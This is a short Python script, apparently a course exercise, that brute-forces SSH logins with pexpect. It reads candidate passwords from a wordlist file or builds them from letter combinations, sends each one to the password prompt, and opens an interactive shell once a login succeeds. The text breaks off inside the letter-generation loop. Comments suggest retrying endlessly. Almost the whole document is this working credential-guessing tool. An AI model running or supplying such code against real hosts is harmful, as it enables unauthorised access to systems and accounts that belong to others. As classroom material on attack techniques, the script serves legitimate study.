#!/usr/bin/python3
#recommended code structure

import pexpect
import sys

textFile = ""
host = ""
password = ""
user = ""
#to generate 3 letter passwords you put a nested for loop inside...2 nested plus the original gives you the 3 letter
def tryLogIn(user,host,password,passwordList):
	#construct the login ctring
	connStr = "ssh " + user + "@" + host
	print(connStr)
	#spawn the ssh process
	child = pexpect.spawn(connStr)
	for password in passwordList:
		print("password = ", password)
	#wait until we see password promt
		returnCode = child.expect(["user","password:"])
		if returnCode == 0:
		#send the password
			child.sendline(password)
		returnCode2 = child.expect(["\$", "try",pexpect.EOF])
		if returnCode2 == 0:
			print("we're in...password was ",password)
			child.sendline()
			child.interact() #returns to user
			sys.exit(0)
		elif returnCode2 == 1:
			print("password was incorrect")
			child.sendline()
		elif returnCode2 == 2:
			child = pexpect.spawn(connStr)
		else:
			print("here")
	print("no more passwords")
	#if we get this far it succeeded
	#instead of giving up if it doesn't get it, it should keep on trying, and go on and on forever until it's let it. stay in same list of passwords 
	#gonna change password to listOfPasswords in top of function

#have to initialze
#pulled from a program from programming fundamentals
def getPasswordFromFile(textFile):
	passwordList = []	
	file = textFile
	with open(textFile) as textFile:
		passwordList = textFile.read().splitlines()
	return passwordList

def getPasswordUsingLetters():
	passwordList = []
	letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
	for first in letters:
